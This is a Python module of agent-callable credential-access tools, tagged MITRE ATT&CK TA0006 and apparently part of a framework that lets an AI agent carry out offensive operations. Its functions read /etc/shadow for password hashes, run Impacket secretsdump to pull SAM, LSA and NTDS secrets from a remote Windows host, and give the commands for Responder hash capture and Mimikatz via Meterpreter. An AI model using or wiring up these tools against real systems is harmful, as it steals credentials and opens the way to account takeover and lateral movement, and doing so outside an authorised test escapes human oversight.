"""
Credential Access Tools
MITRE ATT&CK: TA0006
"""

import subprocess
from src.sdk.tool import function_tool


@function_tool()
def mimikatz_dump() -> str:
    """
    Dump credentials using Mimikatz (Windows).
    Note: Requires elevated privileges on Windows target.
    
    Returns:
        Credential dump results
    """
    try:
        # Check for mimikatz
        result = subprocess.run(
            ["which", "mimikatz"],
            capture_output=True, text=True, timeout=10
        )
        
        if result.returncode != 0:
            return "Mimikatz not available. Use on Windows target or via Meterpreter."
        
        return "Mimikatz requires Windows environment. Use via msfconsole with post/windows/gather/credentials/mimikatz"
    except Exception as e:
        return f"Error: {str(e)}"


@function_tool()
def dump_shadow() -> str:
    """
    Attempt to read /etc/shadow for password hashes (requires root).
    
    Returns:
        Shadow file contents or error
    """
    try:
        result = subprocess.run(
            ["cat", "/etc/shadow"],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            return f"Shadow file contents:\n{result.stdout}"
        else:
            return f"Cannot read shadow file (need root): {result.stderr}"
    except Exception as e:
        return f"Error: {str(e)}"


@function_tool()
def responder_capture(interface: str = "eth0") -> str:
    """
    Start Responder to capture NTLM hashes (LLMNR/NBT-NS poisoning).
    
    Args:
        interface: Network interface to listen on
    
    Returns:
        Responder status
    """
    try:
        # Check for Responder
        result = subprocess.run(
            ["which", "responder"],
            capture_output=True, text=True, timeout=10
        )
        
        if result.returncode != 0:
            return "Responder not found. Install with: apt install responder"
        
        return f"Run Responder manually: sudo responder -I {interface}\nCaptures will be saved to /usr/share/responder/logs/"
    except Exception as e:
        return f"Error: {str(e)}"


@function_tool()
def secretsdump(target: str, username: str, password: str) -> str:
    """
    Dump secrets from remote Windows system using Impacket secretsdump.
    
    Args:
        target: Target IP or hostname
        username: Domain/username for authentication
        password: Password or NTLM hash
    
    Returns:
        Dumped secrets (SAM, LSA, NTDS)
    """
    try:
        result = subprocess.run(
            ["impacket-secretsdump", f"{username}:{password}@{target}"],
            capture_output=True, text=True, timeout=120
        )
        return result.stdout if result.stdout else result.stderr
    except FileNotFoundError:
        return "Impacket not found. Install with: apt install python3-impacket"
    except Exception as e:
        return f"Error: {str(e)}"
